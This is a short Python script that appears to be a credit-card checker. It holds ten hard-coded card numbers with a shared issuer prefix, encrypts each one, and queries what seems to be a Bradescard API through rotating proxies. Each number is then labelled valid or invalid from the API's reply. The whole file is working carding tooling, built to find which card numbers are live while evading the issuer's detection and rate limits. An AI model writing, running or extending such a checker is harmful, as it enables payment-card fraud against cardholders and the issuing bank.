import asyncio

from proxy_handler import get_rotating_proxy
from encryption import encriptar_tarjeta
from bradescard_api import BradesAPI

cards = [
    '4812820322433062',
    '4812820322433096',
    '4812830745268011',
    '4812820322433070',
    '4812810133044018',
    '4812820322433013',
    '4812820322433054',
    '4812820322433013',
    '4812820322433047',
    '4812820322433088',
]


async def main():
    proxy = get_rotating_proxy()
    print('PROXY_CONFIG=', proxy)
    print('PROXY_STRING=', proxy.get('http'))
    print('---')

    for card in cards:
        print(f'CARD={card}')
        try:
            encrypted = encriptar_tarjeta(card)
            print(f'  ENCRYPTED_OK len={len(encrypted)} prefix={encrypted[:20]}...')
            response = await BradesAPI.filter_card(encrypted, proxy.get('http'))
            print(f'  RESPONSE={response}')
            if isinstance(response, dict):
                description = str(response.get('description', '')).lower()
                code = response.get('code')
                if description == 'ok':
                    print('  RESULT=VALIDA')
                elif 'no esta dada de alta' in description:
                    print('  RESULT=INVALIDA')
                elif code == 2:
                    print('  RESULT=INVALIDA')
                elif code and int(code) >= 500:
                    print('  RESULT=INVALIDA')
                else:
                    print('  RESULT=NO_CLASIFICADA')
        except Exception as e:
            print(f'  ERROR={type(e).__name__}: {e}')
        print('---')


if __name__ == '__main__':
    asyncio.run(main())
